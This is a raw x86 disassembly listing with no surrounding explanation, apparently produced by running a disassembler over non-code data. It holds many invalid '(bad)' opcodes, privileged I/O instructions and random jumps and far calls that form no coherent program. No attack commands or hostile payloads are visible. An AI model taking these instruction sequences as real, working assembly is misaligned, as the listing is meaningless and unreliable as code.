  424457:	xchg   ebx,eax
  424458:	dec    eax
  424459:	push   ecx
  42445a:	repz aas 
  42445c:	fnstcw WORD PTR [ebx-0x7d]
  42445f:	into   
  424460:	lds    ecx,FWORD PTR [eax+0x1ce5d133]
  424466:	mov    al,BYTE PTR [eax+0x5651b096]
  42446c:	cmp    al,BYTE PTR [edx-0x43]
  42446f:	sti    
  424470:	push   0xffffffdf
  424472:	aaa    
  424473:	and    al,0xf5
  424475:	lds    ebp,FWORD PTR [eax+eax*8+0x27]
  424479:	xlat   BYTE PTR ds:[ebx]
  42447a:	leave  
  42447b:	mov    edx,0xbdc9e0c5
  424480:	xor    al,0xce
  424482:	loop   0x4244b9
  424484:	pop    esi
  424485:	cmp    eax,0x91d0ae98
  42448a:	and    al,0xa6
  42448c:	mov    edi,0x98582cb9
  424491:	xchg   esp,eax
  424492:	mov    al,ds:0x539d26e
  424497:	cmp    al,0x2a
  424499:	das    
  42449a:	and    DWORD PTR [edi],edx
  42449c:	in     eax,dx
  42449d:	lods   al,BYTE PTR ds:[esi]
  42449e:	mov    edi,0x899995da
  4244a3:	pop    ebp
  4244a4:	jb     0x424472
  4244a6:	ins    BYTE PTR es:[edi],dx
  4244a7:	jecxz  0x42448f
  4244a9:	inc    esi
  4244aa:	(bad)  
  4244ac:	xchg   esi,eax
  4244ad:	inc    eax
  4244ae:	js     0x42446c
  4244b0:	xchg   esp,eax
  4244b1:	mov    ecx,0xdcc79d9f
  4244b6:	shl    BYTE PTR [ecx],1
  4244b8:	aad    0xb2
  4244ba:	fist   WORD PTR [esi+0x33d3aec0]
  4244c0:	jae    0x424456
  4244c2:	sbb    DWORD PTR [ebx],esp
  4244c4:	push   esp
  4244c5:	loop   0x4244f3
  4244c7:	xchg   edx,eax
  4244c8:	es mov dl,0xf4
  4244cb:	stos   BYTE PTR es:[edi],al
  4244cc:	add    BYTE PTR [ebx+0x297e9bd4],bl
  4244d2:	sub    bl,BYTE PTR [ebp+0x3d]
  4244d5:	aaa    
  4244d6:	sub    dl,al
  4244d8:	pop    es
  4244d9:	jnp    0x4244b8
  4244db:	ja     0x424475
  4244dd:	mov    ecx,0x5d31b307
  4244e2:	(bad)  
  4244e3:	fadd   QWORD PTR [edi+0x3f32dc1]
  4244e9:	in     eax,dx
  4244ea:	inc    edi
  4244eb:	add    BYTE PTR [edx+ecx*1-0x1e54b8e5],ah
  4244f2:	hlt    
  4244f3:	xchg   BYTE PTR [ebp+0x37cbcf9b],dh
  4244f9:	adc    ebx,DWORD PTR [edx+0x5e696190]
  4244ff:	add    DWORD PTR [edx-0x2b],ebp
  424502:	and    DWORD PTR [eax+esi*4+0x1f1bdd4f],0x44b2af07
  42450d:	inc    ebp
  42450e:	add    bh,bh
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x7c],1
  424581:	lock ror edx,1
  424584:	cwde   
  424585:	add    DWORD PTR [ecx],0x0
  424588:	add    al,0x1
  42458a:	add    BYTE PTR [eax],al
  42458c:	cmp    DWORD PTR [edi+0x3c],edi
  42458f:	test   ch,dh
  424591:	stc    
  424592:	or     al,0x62
  424594:	cs mov eax,0x1ab7d6ce
  42459a:	je     0x42451c
  42459c:	dec    ebp
  42459d:	mov    ah,0x38
  42459f:	out    0x45,eax
  4245a1:	rcl    BYTE PTR [esi+0x5c774334],cl
  4245a7:	xor    dl,BYTE PTR [ebx]
  4245a9:	adc    dh,BYTE PTR [eax]
  4245ab:	popa   
  4245ac:	nop
  4245ad:	adc    BYTE PTR [eax+0x4e063e1d],ch
  4245b3:	cs push edx
  4245b5:	jnp    0x42456a
  4245b7:	data16 mov al,0x6f
  4245ba:	xchg   DWORD PTR [esi+edi*4-0x44602441],ebp
  4245c1:	sbb    DWORD PTR [edx],0xd65cdc4c
  4245c7:	xor    esi,ebp
  4245c9:	outs   dx,BYTE PTR ds:[esi]
  4245ca:	(bad)  
  4245cc:	jge    0x424616
  4245ce:	add    eax,0x66e3facc
  4245d3:	addr16 xor ebp,edx
  4245d6:	into   
  4245d7:	stos   BYTE PTR es:[edi],al
  4245d8:	retf   
  4245d9:	cs push ebx
  4245db:	push   ebx
  4245dc:	pop    ecx
  4245dd:	fistp  WORD PTR [ecx]
  4245df:	xlat   BYTE PTR ds:[ebx]
  4245e0:	push   eax
  4245e1:	(bad)  
  4245e2:	shr    BYTE PTR [ecx],1
  4245e4:	push   edi
  4245e5:	xor    eax,0x87f47bca
  4245ea:	leave  
  4245eb:	pop    esi
  4245ec:	and    eax,0x44afc01
  4245f1:	std    
  4245f2:	les    esi,FWORD PTR [ebx+0x67]
  4245f5:	dec    esp
  4245f6:	out    0x37,eax
  4245f8:	mov    ecx,0x44ca4ff5
  4245fd:	imul   eax,DWORD PTR [ecx-0x60],0x79
  424601:	psllw  mm4,QWORD PTR ss:[edx+ebx*1]
  424606:	xchg   esp,eax
  424607:	fadd   DWORD PTR [esi]
  424609:	fadd   DWORD PTR [eax-0x511428ce]
  42460f:	sbb    al,0x39
  424611:	imul   ecx,DWORD PTR [eax-0x24],0xffffffdb
  424615:	call   FWORD PTR [esi]
  424617:	test   edx,esi
  424619:	fs sub al,0xc7
  42461c:	clc    
  42461d:	and    al,0xf0
  42461f:	sahf   
  424620:	mov    ch,0x1b
  424622:	and    ebp,DWORD PTR [edi+0x44]
  424625:	pop    es
  424626:	add    al,0xd5
  424628:	ret    0xc3e7
  42462b:	outs   dx,BYTE PTR ds:[esi]
  42462c:	adc    esi,DWORD PTR [edi-0x7633974b]
  424632:	jne    0x424657
  424634:	aam    0x37
  424636:	sbb    eax,0x5899d970
  42463b:	sbb    eax,0x3c4d1680
  424640:	cmp    al,BYTE PTR [edx+0x17bba593]
  424646:	retf   
  424647:	into   
  424648:	push   0xdc97f966
  42464d:	mov    DWORD PTR [edi-0x2e82cb75],edi
  424653:	jp     0x4246c1
  424655:	ins    BYTE PTR es:[edi],dx
  424656:	add    BYTE PTR cs:[edi-0x73c892c9],0x68
  42465e:	outs   dx,BYTE PTR ds:[esi]
  42465f:	pop    es
  424660:	push   0xfffffff6
  424662:	mov    BYTE PTR [edx+0x4d544101],ch
  424668:	sub    eax,DWORD PTR [ecx]
  42466a:	das    
  42466b:	rcl    BYTE PTR [ebx-0x5cc4c77f],1
  424671:	inc    eax
  424672:	xchg   edi,eax
  424673:	sbb    bx,WORD PTR ds:0x5e833171
  42467a:	dec    ebp
  42467b:	out    0x5,eax
  42467d:	xchg   ebx,eax
  42467e:	hlt    
  42467f:	mov    BYTE PTR [edi-0x1f],ch
  424682:	aam    0x39
  424684:	fisttp DWORD PTR [ebp-0x27797bcc]
  42468a:	mov    al,ds:0xf200441a
  42468f:	mov    bl,0x0
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    dh,bl
  424701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424702:	test   al,0x39
  424704:	pushf  
  424705:	test   BYTE PTR [ecx],al
  424707:	add    BYTE PTR [ecx+eax*1],al
  42470a:	add    BYTE PTR [eax],al
  42470c:	and    BYTE PTR [edx-0x61],bh
  42470f:	daa    
  424710:	cld    
  424711:	sbb    edx,DWORD PTR [eax-0x48a1a00d]
  424717:	icebp  
  424718:	lea    edx,[edx]
  42471a:	mov    eax,ds:0xadbb14c8
  42471f:	neg    BYTE PTR [eax+0x79bb615a]
  424725:	and    dl,BYTE PTR [esi+ecx*8]
  424728:	pop    es
  424729:	fs aam 0x3c
  42472c:	lds    ecx,FWORD PTR [ebx+ebx*2]
  42472f:	stos   BYTE PTR es:[edi],al
  424730:	repnz fcom QWORD PTR [eax+0x53]
  424734:	fbstp  TBYTE PTR [ecx]
  424736:	and    BYTE PTR [eax+0x6d4df332],0x8e
  42473d:	inc    esp
  42473e:	mov    al,0x65
  424740:	cmp    eax,0x790086a5
  424745:	xor    dh,BYTE PTR [edi+edx*4-0x504ed775]
  42474c:	pop    ebp
  42474d:	push   es
  42474e:	jmp    0x4246d3
  424750:	mov    BYTE PTR [eax],dl
  424752:	xchg   edx,eax
  424753:	mov    bl,0x89
  424755:	mov    edx,0x7689f7f5
  42475a:	or     DWORD PTR [eax-0x3aaf2936],edi
  424760:	(bad)  
  424761:	div    DWORD PTR [edi-0x5e]
  424764:	call   0x822d:0x11bed5ca
  42476b:	neg    ch
  42476d:	out    0x2d,eax
  42476f:	(bad)  
  424770:	dec    ebp
  424771:	aas    
  424772:	ss adc eax,0xc17fca8d
  424778:	xor    DWORD PTR [eax+0x24ba7f63],ebx
  42477e:	pusha  
  42477f:	pop    edi
  424780:	stos   BYTE PTR es:[edi],al
  424781:	dec    ebx
  424782:	lahf   
  424783:	repnz xchg ecx,eax
  424785:	(bad)
  424788:	push   ebx
  424789:	mov    esi,0x25f382d4
  42478e:	xchg   esp,eax
  42478f:	mov    ecx,DWORD PTR [edi+0x618a080c]
  424795:	mov    BYTE PTR ds:0x68247015,0xd3
  42479c:	adc    DWORD PTR [edx],ebp
  42479e:	retf   
  42479f:	xchg   edi,eax
  4247a0:	push   0xffffffe2
  4247a2:	scas   al,BYTE PTR es:[edi]
  4247a3:	xchg   DWORD PTR [eax+0x326aa3ba],eax
  4247a9:	ja     0x4247cf
  4247ab:	mov    al,0x52
  4247ad:	xchg   ecx,eax
  4247ae:	enter  0xc2e5,0x6
  4247b2:	clc    
  4247b3:	loope  0x424832
  4247b5:	int    0x9b
  4247b7:	fisub  DWORD PTR [ebx-0xc]
  4247ba:	inc    ebx
  4247bb:	stos   DWORD PTR es:[edi],eax
  4247bc:	xor    BYTE PTR [ebx+0x7b],bl
  4247bf:	loopne 0x4247bf
  4247c1:	jl     0x42480c
  4247c3:	xor    BYTE PTR [eax+0x47],al
  4247c6:	fcomp  QWORD PTR [eax-0x3d4e1c7d]
  4247cc:	scas   eax,DWORD PTR es:[edi]
  4247cd:	dec    ebp
  4247ce:	ret    
  4247cf:	mov    ds:0x6205fd0e,eax
  4247d4:	sub    edx,DWORD PTR [esp+edi*2+0x2b]
  4247d8:	fs cmp al,0x2e
  4247db:	mov    ch,0x4f
  4247dd:	addr16 jp 0x4247d6
  4247e0:	fcom   DWORD PTR [ebp-0x5ce34f5d]
  4247e6:	sub    ecx,DWORD PTR [esi-0x7e]
  4247e9:	adc    eax,0xea92834b
  4247ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247ef:	mov    eax,ds:0x5ce72154
  4247f4:	cwde   
  4247f5:	push   edi
  4247f6:	ret    
  4247f7:	jp     0x424857
  4247f9:	int    0xa5
  4247fb:	push   edi
  4247fc:	les    ebp,FWORD PTR [edx+0xc748c77]
  424802:	ror    bh,cl
  424804:	and    ebp,DWORD PTR [edi+0x44]
  424807:	imul   edx,DWORD PTR [ecx-0x2abf421b],0xffffffe5
  42480e:	mov    ds:0xdf,eax
	...
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	sar    BYTE PTR [ebx+0x0],0x65
  424884:	mov    al,ds:0x4000185
  424889:	add    DWORD PTR [eax],eax
  42488b:	add    BYTE PTR [eax],al
  42488d:	cdq    
  42488e:	pop    edx
  42488f:	stos   DWORD PTR es:[edi],eax
  424890:	je     0x424867
  424892:	xchg   esi,eax
  424893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424894:	sbb    BYTE PTR [ebx+0x4691ce32],bl
  42489a:	mov    edx,0xccee579e
  42489f:	sbb    bh,BYTE PTR [edx+0x58]
  4248a2:	dec    esp
  4248a3:	sti    
  4248a4:	push   edx
  4248a5:	enter  0x1da3,0x2e
  4248a9:	mov    ah,0xc3
  4248ab:	add    esi,DWORD PTR [edi+0x47]
  4248ae:	cdq    
  4248af:	push   eax
  4248b0:	or     eax,eax
  4248b2:	mov    eax,0x70424ab
  4248b7:	pop    edx
  4248b8:	js     0x424879
  4248ba:	fist   WORD PTR [edx+0x36]
  4248bd:	je     0x42487e
  4248bf:	mov    bh,0xd
  4248c1:	jmp    0x42487b
  4248c3:	mov    ecx,0xdaff37d6
  4248c8:	addr16 push ebp
  4248ca:	cmp    al,0x76
  4248cc:	mov    esi,ebx
  4248ce:	in     eax,0x16
  4248d0:	cmp    DWORD PTR [edi+0x662b4344],esi
  4248d6:	aaa    
  4248d7:	cdq    
  4248d8:	loope  0x4248c6
  4248da:	mov    ah,0xd0
  4248dc:	in     eax,dx
  4248dd:	push   0xffffffe1
  4248df:	jns    0x424887
  4248e1:	adc    bl,BYTE PTR [esp+ebp*4]
  4248e4:	sbb    bh,BYTE PTR [eax-0x37]
  4248e7:	mov    ss,esp
  4248e9:	ss leave 
  4248eb:	and    BYTE PTR [edx+0x495af2d0],0xe4
  4248f2:	sbb    al,0x82
  4248f4:	pop    ebp
  4248f5:	mov    ecx,0xc6202755
  4248fa:	adc    al,0x3e
  4248fc:	mov    bh,0xd6
  4248fe:	cdq    
  4248ff:	jnp    0x4248dd
  424901:	pop    edx
  424902:	in     al,0xdd
  424904:	cs dec edi
  424906:	cmc    
  424907:	cmp    eax,0xe4a95726
  42490c:	inc    edx
  42490d:	ds inc edi
  42490f:	fistp  WORD PTR [edx-0x141b2eab]
  424915:	(bad)  
  424916:	loopne 0x4248b2
  424918:	mov    ds:0xe2c98083,eax
  42491e:	test   al,0x21
  424920:	or     eax,0xdc2939c1
  424925:	add    dl,BYTE PTR [edi+0x32]
  424928:	inc    ebx
  424929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42492a:	mov    ecx,0x8dd9e2f9
  42492f:	mov    ds:0xd27deae1,al
  424934:	in     eax,0xa6
  424936:	sbb    DWORD PTR [edi-0x65b83885],edi
  42493c:	aad    0xb6
  42493e:	mov    ebx,0x94fcd625
  424943:	sahf   
  424944:	loop   0x424991
  424946:	pop    ebp
  424947:	fnstenv [eax+0x5836fbf2]
  42494d:	xor    ecx,DWORD PTR [edx]
  42494f:	retf   0x6e5b
  424952:	test   al,0xab
  424954:	mov    cl,dl
  424956:	clc    
  424957:	push   0x27
  424959:	pop    ebx
  42495a:	fnstsw WORD PTR [esp+ebx*4+0x7a59df51]
  424961:	and    DWORD PTR [edi-0xd],ebp
  424964:	sub    BYTE PTR ds:[ebp-0x16f11a93],0x2f
  42496c:	inc    esp
  42496d:	std    
  42496e:	add    DWORD PTR [edi-0x7ac8d12e],edi
  424974:	mov    ecx,DWORD PTR [esi+0x1]
  424977:	jecxz  0x424922
  424979:	stos   DWORD PTR es:[edi],eax
  42497a:	iret   
  42497b:	ret    
  42497c:	cmp    DWORD PTR es:[eax],esp
  42497f:	inc    eax
  424980:	sub    dh,BYTE PTR [ebx+0x70f9a1ee]
  424986:	sbb    ah,BYTE PTR [ebx-0x2fd3d391]
  42498c:	test   BYTE PTR [edx+0x4],0x4a
	...
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    dl,BYTE PTR [ebx-0x5b16fa8b]
  424a05:	xchg   BYTE PTR [ecx],al
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	out    0xbc,al
  424a0e:	outs   dx,BYTE PTR ds:[esi]
  424a0f:	cmp    BYTE PTR [ebx-0x4f528067],dl
  424a15:	pop    ebx
  424a16:	inc    eax
  424a17:	(bad)  
  424a18:	js     0x424a00
  424a1a:	push   fs
  424a1c:	ret    
  424a1d:	aam    0x2
  424a1f:	xor    eax,ebx
  424a21:	inc    ah
  424a23:	jne    0x424a39
  424a25:	mov    dl,BYTE PTR [ecx+0x5e]
  424a28:	mov    ebp,0xb1c11a52
  424a2d:	sbb    edi,esp
  424a2f:	test   eax,0x2be3aa4c
  424a34:	push   ebp
  424a35:	cmp    eax,0x943b3eae
  424a3a:	cmp    eax,0x92926fad
  424a3f:	iret   
  424a40:	and    al,BYTE PTR [esi-0xa]
  424a43:	push   ebp
  424a44:	lods   eax,DWORD PTR ds:[si]
  424a46:	sub    DWORD PTR [eax-0x52b19834],ecx
  424a4c:	xchg   edi,eax
  424a4d:	or     ch,BYTE PTR [edx-0x67]
  424a50:	adc    al,0x1e
  424a52:	sar    DWORD PTR [ecx+0x75],cl
  424a55:	push   edi
  424a56:	push   es
  424a57:	jl     0x424a82
  424a59:	loopne 0x424a5c
  424a5b:	pop    ebx
  424a5c:	push   cs
  424a5d:	aam    0x74
  424a5f:	sub    BYTE PTR ds:0xf5ad8034,0xbd
  424a66:	js     0x424a97
  424a68:	imul   ebp,DWORD PTR [ebx],0xf1ca173f
  424a6e:	pop    es
  424a6f:	jae    0x424a12
  424a71:	mov    dh,0x45
  424a73:	xor    eax,0x609b42fe
  424a78:	arpl   WORD PTR [ebx-0x2fd875c8],di
  424a7e:	in     al,dx
  424a7f:	bound  esp,QWORD PTR gs:[ebp-0x9]
  424a83:	(bad)  
  424a84:	adc    ah,bh
  424a86:	popf   
  424a87:	ss pop esp
  424a89:	dec    ecx
  424a8a:	xor    BYTE PTR [ebx],0xed
  424a8d:	dec    ecx
  424a8e:	les    esi,FWORD PTR [eax-0x68]
  424a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a92:	push   es
  424a93:	je     0x424a5b
  424a95:	inc    esp
  424a96:	out    0xc8,eax
  424a98:	dec    edi
  424a99:	mov    DWORD PTR [ecx+0x1b],ebp
  424a9c:	test   DWORD PTR [edi],0xd53f27d4
  424aa2:	retf   
  424aa3:	or     ch,cl
  424aa5:	outs   dx,DWORD PTR ds:[esi]
  424aa6:	(bad)  
  424aa7:	adc    ah,BYTE PTR [ebp-0x950e4f0]
  424aad:	inc    ebx
  424aae:	jae    0x424aa3
  424ab0:	push   esp
  424ab1:	div    DWORD PTR [esi+0x71fb7d7]
  424ab7:	fmul   DWORD PTR [esi+0x3ff5db04]
  424abd:	adc    BYTE PTR [edx+esi*4],ah
  424ac0:	inc    eax
  424ac1:	pop    ss
  424ac2:	inc    edx
  424ac3:	int    0xbf
  424ac5:	sbb    BYTE PTR [esi+0x5a],bl
  424ac8:	jnp    0x424ade
  424aca:	jg     0x424a8c
  424acc:	enter  0x38e7,0xe9
  424ad0:	cmc    
  424ad1:	retf   
  424ad2:	xchg   esi,ecx
  424ad4:	push   ecx
  424ad5:	loopne 0x424a68
  424ad7:	pop    ds
  424ad8:	add    BYTE PTR [ecx+ebx*2],0x15
  424adc:	call   0x65d4:0x4fdd35e4
  424ae3:	sub    al,0xd4
  424ae5:	push   0x18fb9064
  424aea:	adc    eax,0x7e6a9cf7
  424aef:	repnz sub eax,0x52920c8f
  424af5:	arpl   WORD PTR [edi-0x4940779d],bx
  424afb:	ret    0x72cc
  424afe:	pop    esi
  424aff:	or     cl,BYTE PTR [eax-0x47]
  424b02:	cmp    ch,BYTE PTR [edi+esi*4]
  424b05:	imul   ecx,DWORD PTR [ecx+0x39caeb14],0xffffff9d
  424b0c:	jecxz  0x424aa8
  424b0e:	(bad)
	...
  424b72:	add    BYTE PTR [eax],al
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	or     al,0x8d
  424b82:	dec    eax
  424b83:	mov    eax,0x187a8
  424b88:	add    al,0x1
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	xchg   esi,eax
  424b8d:	jge    0x424b15
  424b8f:	jle    0x424b6c
  424b91:	dec    edi
  424b92:	inc    esi
  424b93:	(bad)  
  424b94:	gs cmp eax,esp
  424b97:	daa    
  424b98:	xchg   ecx,eax
  424b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b9a:	inc    eax
  424b9b:	stos   DWORD PTR es:[edi],eax
  424b9c:	mov    ebx,ecx
  424b9e:	(bad)  
  424b9f:	cmp    al,0xb3
  424ba1:	pop    edx
  424ba2:	pop    esi
  424ba3:	hlt    
  424ba4:	popf   
  424ba5:	xchg   edx,eax
  424ba6:	les    ecx,FWORD PTR [eax+0x26]
  424ba9:	mov    edi,0xb1cce50d
  424bae:	sbb    edi,DWORD PTR [ebx]
  424bb0:	sbb    DWORD PTR [edi-0x5ec6da9a],0xc7cee9c9
  424bba:	jns    0x424b50
  424bbc:	push   ebx
  424bbd:	arpl   sp,si
  424bbf:	xchg   edi,eax
  424bc0:	sbb    eax,0xe6dd014f
  424bc5:	ds xor eax,0xcb25c7b1
  424bcb:	push   es
  424bcc:	lea    ebx,[esi+esi*4+0x41]
  424bd0:	xor    BYTE PTR [esi],0xaf
  424bd3:	hlt    
  424bd4:	pop    esi
  424bd5:	std    
  424bd6:	scas   al,BYTE PTR es:[edi]
  424bd7:	sbb    ebp,DWORD PTR [eax]
  424bd9:	fistp  QWORD PTR [ecx+ebx*8-0x154ae856]
  424be0:	jp     0x424b7d
  424be2:	addr16 push edi
  424be4:	or     eax,0x76087edd
  424be9:	rcr    DWORD PTR [edx],cl
  424beb:	cmp    DWORD PTR [edi+0x69781248],esi
  424bf1:	imul   edx,ebp,0xffffff81
  424bf4:	sub    eax,ecx
  424bf6:	loopne 0x424b80
  424bf8:	nop
  424bf9:	addr16 dec ebp
  424bfb:	in     al,dx
  424bfc:	mov    gs,WORD PTR [edx+0x57]
  424bff:	xchg   BYTE PTR [ebp+0x50],dh
  424c02:	test   dl,ah
  424c04:	leave  
  424c05:	sbb    ch,BYTE PTR [esi+ebp*1-0x43aa9cda]
  424c0c:	mov    WORD PTR [esi-0x3],ds
  424c0f:	xor    eax,0x32855fb3
  424c14:	jae    0x424be9
  424c16:	retf   0xf00e
  424c19:	popf   
  424c1a:	cmp    esp,esi
  424c1c:	in     al,dx
  424c1d:	sub    eax,0x1a5bdc6
  424c22:	mov    WORD PTR [ebx+0x421dba5f],?
  424c28:	hlt    
  424c29:	add    BYTE PTR [eax],0x14
  424c2c:	ss sub eax,0x7a199d55
  424c32:	pop    edi
  424c33:	sbb    ebp,ecx
  424c35:	sbb    esi,eax
  424c37:	fwait
  424c38:	jp     0x424beb
  424c3a:	push   es
  424c3b:	mov    ch,0x2f
  424c3d:	adc    cl,bl
  424c3f:	mov    al,0x34
  424c41:	es addr16 cli 
  424c44:	push   eax
  424c45:	adc    BYTE PTR [edx-0x7290e4eb],0x8b
  424c4c:	repz das 
  424c4e:	outs   dx,BYTE PTR ds:[esi]
  424c4f:	and    al,0x41
  424c51:	mov    dh,0x43
  424c53:	retf   0xf30f
  424c56:	inc    edx
  424c57:	fisubr DWORD PTR [esi]
  424c59:	test   WORD PTR [edx+ebp*2],sp
  424c5d:	mov    dl,0x4
  424c5f:	mov    edx,0xbcea910c
  424c64:	pop    eax
  424c65:	jmp    0x1350:0x13b0af3
  424c6c:	into   
  424c6d:	test   al,0x79
  424c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c70:	scas   al,BYTE PTR es:[edi]
  424c71:	js     0x424c5a
  424c73:	mov    BYTE PTR [ecx],0xac
  424c76:	loopne 0x424c50
  424c78:	mov    ah,0x4
  424c7a:	bound  edx,QWORD PTR [eax+0x21]
  424c7d:	mov    DWORD PTR [edx+edi*1-0xe5e6b85],eax
  424c84:	or     dh,BYTE PTR [eax-0x35]
  424c87:	sbb    bl,BYTE PTR [edi]
  424c89:	cli    
  424c8a:	imul   eax,DWORD PTR [ecx+0x68054a5],0x0
	...
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx+0x198b51a8]
  424d02:	mul    DWORD PTR [eax-0x54]
  424d05:	mov    BYTE PTR [ecx],al
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	sbb    DWORD PTR [ebx+0x41],esp
  424d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d10:	cmp    DWORD PTR [esp+ecx*8],0xa0ab2e03
  424d17:	sar    eax,cl
  424d19:	cmp    ecx,DWORD PTR [ebp-0x2f]
  424d1c:	cmp    eax,0x9e6a9846
  424d21:	add    BYTE PTR [edx+0xd],cl
  424d24:	pop    esi
  424d25:	pop    ebp
  424d26:	call   0x31e8:0xce404255
  424d2d:	repz sti 
  424d2f:	adc    ecx,DWORD PTR [ebx+0x45ae4c7a]
  424d35:	push   cs
  424d36:	cdq    
  424d37:	xor    DWORD PTR [edx],0x69
  424d3a:	cmp    al,0xef
  424d3c:	jnp    0x424d94
  424d3e:	retf   
  424d3f:	sub    dh,bh
  424d41:	sbb    ebp,edx
  424d43:	call   0xbde5eb70
  424d48:	jg     0x424d95
  424d4a:	mov    dh,0xae
  424d4c:	dec    ecx
  424d4d:	sub    dl,dh
  424d4f:	aas    
  424d50:	pop    ebx
  424d51:	push   ss
  424d52:	xor    eax,0xe97c1f9f
  424d57:	rcr    BYTE PTR [esi+0x66f5066a],0x49
  424d5e:	inc    ebp
  424d5f:	bound  ebp,QWORD PTR [edx]
  424d61:	adc    DWORD PTR [eax],esp
  424d63:	pop    ds
  424d64:	push   edi
  424d65:	loop   0x424db8
  424d67:	cwde   
  424d68:	scas   al,BYTE PTR es:[edi]
  424d69:	mov    eax,0xe0b9b591
  424d6e:	js     0x424de2
  424d70:	lds    edi,FWORD PTR [ebp-0x7915512]
  424d76:	in     al,0x36
  424d78:	retf   
  424d79:	in     eax,0xaa
  424d7b:	or     edi,DWORD PTR [ebp-0x6ffeef47]
  424d81:	lods   al,BYTE PTR ds:[esi]
  424d82:	inc    edi
  424d83:	and    ch,BYTE PTR [ecx+edi*4-0x6b]
  424d87:	dec    eax
  424d88:	push   esi
  424d89:	fsubr  QWORD PTR [edi+0x112058c2]
  424d8f:	call   0xf74eabff
  424d94:	fstp   TBYTE PTR [ecx+0x52]
  424d97:	dec    eax
  424d98:	adc    al,0x75
  424d9a:	jl     0x424d39
  424d9c:	sub    eax,0x55c34003
  424da1:	pop    edx
  424da2:	std    
  424da3:	shl    DWORD PTR [edi],0xfe
  424da6:	inc    edx
  424da7:	push   es
  424da8:	mov    al,ds:0xce170527
  424dad:	jl     0x424dc1
  424daf:	sti    
  424db0:	pop    es
  424db1:	mov    edi,0x59881929
  424db6:	cmp    DWORD PTR ds:0x5433a1fd,0x879f6b02
  424dc0:	retf   
  424dc1:	pop    ebp
  424dc3:	push   cs
  424dc4:	popa   
  424dc5:	xchg   DWORD PTR [edi+ebx*8-0x41f014ad],esp
  424dcc:	and    eax,0x90824c3a
  424dd1:	loope  0x424e23
  424dd3:	mov    DWORD PTR [ecx+0x69],esp
  424dd6:	xor    DWORD PTR [edi],esi
  424dd8:	push   ebp
  424dd9:	jae    0x424e0b
  424ddb:	into   
  424ddc:	fcomp  QWORD PTR [eax]
  424dde:	mov    ah,0xcc
  424de0:	cmp    BYTE PTR [eax+ecx*2-0x4f],dh
  424de4:	inc    ecx
  424de5:	lds    ecx,FWORD PTR [edx]
  424de7:	xchg   ecx,eax
  424de8:	push   ebp
  424de9:	pushf  
  424dea:	cmp    eax,0xec553933
  424def:	xchg   DWORD PTR [ecx+0x2d451243],ebp
  424df5:	inc    ecx
  424df6:	sbb    bh,BYTE PTR [esi+ebp*1-0x32fd76f9]
  424dfd:	inc    ebx
  424dfe:	loop   0x424e6e
  424e00:	or     al,cl
  424e02:	sbb    esi,DWORD PTR [esi-0x68]
  424e05:	fisttp DWORD PTR [eax-0x214d14bf]
  424e0b:	push   ds
  424e0c:	sahf   
  424e0d:	imul   edi,DWORD PTR [esi],0x52
	...
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e36
  424e81:	mov    ebp,0x89b0b95d
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    al,0x1
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	adc    esi,0x2
  424e8f:	mov    bh,0xca
  424e91:	add    BYTE PTR [edi+0x24],0x3a
  424e95:	dec    edi
  424e96:	repnz mov WORD PTR [edi+0x4e],cs
  424e9a:	pop    eax
  424e9b:	mov    cl,0xbd
  424e9d:	out    0x28,eax
  424e9f:	mov    DWORD PTR [esi],esi
  424ea1:	pop    ebp
  424ea2:	sub    eax,0x816ecd6e
  424ea7:	sbb    eax,0xa712e80d
  424eac:	into   
  424ead:	in     al,0xbc
  424eaf:	aad    0x4e
  424eb1:	cmp    BYTE PTR [ebx+eax*8-0x44713191],al
  424eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424eb9:	sub    DWORD PTR [edi+0x4a],edx
  424ebc:	push   edx
  424ebd:	and    ebx,DWORD PTR [esp+eiz*2+0x26]
  424ec1:	imul   edi,DWORD PTR [eax],0x5c
  424ec4:	arpl   WORD PTR [eax-0x72],ax
  424ec7:	jns    0x424efe
  424ec9:	cmp    DWORD PTR [ebp*2+0x1bb733f8],0xffffff85
  424ed1:	inc    ecx
  424ed2:	repnz bound edx,QWORD PTR [ecx]
  424ed5:	dec    edi
  424ed6:	mov    cl,0x1c
  424ed8:	push   0xffffffb6
  424eda:	or     eax,0x15a81ebf
  424edf:	sti    
  424ee0:	add    eax,DWORD PTR [edx+ecx*8+0x1dd7a1af]
  424ee7:	sbb    bl,BYTE PTR ds:0x625746c9
